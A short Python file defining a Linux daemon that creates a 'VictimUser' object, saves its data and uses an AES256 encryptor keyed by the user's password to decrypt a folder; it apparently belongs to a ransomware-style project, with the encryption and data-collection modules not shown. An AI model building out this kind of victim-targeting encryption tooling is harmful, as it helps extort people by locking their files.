import Encryptor
import User


class DaemonLinux:

    def __init__(self, tout = 5):
        self.stdin_path = '/dev/null'
        self.stdout_path = '/dev/tty'
        self.stderr_path = '/dev/tty'
        self.pidfile_path = '/tmp/foo.pid'
        self.pidfile_timeout = tout

    def run(self):
        user = User.VictimUser()
        user.save_user_data()
        encryptor = Encryptor.AES256(user.Psw);
        encryptor.decrypt_folder("/path/to/decrypt/folder")
